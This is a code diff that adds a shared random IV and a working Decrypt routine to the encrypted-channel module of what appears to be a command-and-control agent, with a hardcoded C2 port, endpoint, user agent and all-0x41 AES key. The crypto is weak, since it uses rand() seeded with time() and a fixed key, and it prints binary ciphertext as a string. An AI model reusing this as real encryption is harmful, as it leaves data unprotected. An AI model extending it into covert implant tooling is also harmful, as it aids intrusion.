@@ -47,6 +47,7 @@ const short    C2_PORT         = 80;
 const wchar_t* C2_API_ENDPOINT = L"/post";
 const wchar_t* C2_USER_AGENT   = L"TESTNG AGENT";
 char           C2_AES_KEY[16]  = { 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41 };
+char           C2_AES_IV[16]   = {0}; // fill in later
 
 // Global handles for communication
 HINTERNET hSession       = NULL;
@@ -107,6 +108,21 @@ int SetupComms() {
         c2_log("[!] SetupComms:BCryptGenerateSymmetricKey failed with status 0x%x\n", status);
         return -1;
     }
+
+    // Generate random IV
+    srand ((unsigned int) time(NULL));
+    for(int i=0; i < 16; i++) {
+        C2_AES_IV[i] = (char) (rand() & 0xFF);
+    }
+
+
+    // TEST
+    int size;
+    char* msg = "testing123";
+    char* ct = Encrypt(msg, 10, &size);
+    c2_log("[*] CIPHERTEXT: %s\n", ct);
+    char* og = Decrypt(ct, size, &size);
+    c2_log("[*] MESSAGE   : %s\n", og);
 
     return 0;
 }
@@ -181,35 +197,57 @@ char* unbase64(char* buffer, int len) {
 // Encrypts given message of length len.
 // Returns pointer to ciphertext buffer.
 char* Encrypt(char* msg, int len, int* pOutLen) {
-
     NTSTATUS status;
-    char IV[16] = {0};
-    char* out;
+    char iv[16];
+    char* ciperhtext;
 
-    // Generate random IV
-    srand ((unsigned int) time(NULL));
-    for(int i=0; i < 16; i++) {
-        IV[i] = (char) (rand() & 0xFF);
-    }
+    // Copy IV over since the API call modifies the IV
+    memcpy(iv, C2_AES_IV, 16);
 
     // First call will fail and tell us how much data to allocate (stored in pOutLen)
-    BCryptEncrypt(hKey, msg, len, NULL, IV, sizeof(IV), NULL, 0, pOutLen, BCRYPT_BLOCK_PADDING);
+    BCryptEncrypt(hKey, msg, len, NULL, iv, sizeof(iv), NULL, 0, pOutLen, BCRYPT_BLOCK_PADDING);
 
     // Allocate memory
-    out = (char*) Malloc(*pOutLen);
+    ciperhtext = (char*) Malloc(*pOutLen);
 
     // Now perform actual encryption
-    status = BCryptEncrypt(hKey, msg, len, NULL, IV, sizeof(IV), out, *pOutLen, pOutLen, BCRYPT_BLOCK_PADDING);
+    status = BCryptEncrypt(hKey, msg, len, NULL, iv, sizeof(iv), ciperhtext, *pOutLen, pOutLen, BCRYPT_BLOCK_PADDING);
     if (status != STATUS_SUCCESS) {
-        c2_log("[!] SetupComms:BCryptGenerateSymmetricKey failed with status 0x%x\n", status);
-        Free(out);
+        c2_log("[!] SetupComms:BCryptEncrypt failed with status 0x%x\n", status);
+        Free(ciperhtext);
         return NULL;
     }
 
-    return out;
+    return ciperhtext;
 }
 
-char* Decrypt(char* ciphertext, int len, int* pOutLen) {return NULL;}
+
+// Decrypts given message of length len.
+// Returns pointer to message buffer.
+char* Decrypt(char* ciphertext, int len, int* pOutLen) {
+    NTSTATUS status;
+    char iv[16];
+    char* message;
+
+    // Copy IV over since the API call modifies the IV
+    memcpy(iv, C2_AES_IV, 16);
+
+    // First call will fail and tell us how much data to allocate (stored in pOutLen)
+    status = BCryptDecrypt(hKey, ciphertext, len, NULL, iv, sizeof(iv), NULL, 0, pOutLen, BCRYPT_BLOCK_PADDING);
+
+    // Allocate memory
+    message = (char*) Malloc(*pOutLen);
+
+    // Now perform actual encryption
+    status = BCryptDecrypt(hKey, ciphertext, len, NULL, iv, sizeof(iv), message, *pOutLen, pOutLen, BCRYPT_BLOCK_PADDING);
+    if (status != STATUS_SUCCESS) {
+        c2_log("[!] SetupComms:BCryptDecrypt failed with status 0x%x\n", status);
+        Free(message);
+        return NULL;
+    }
+
+    return message;
+}
 
 
 
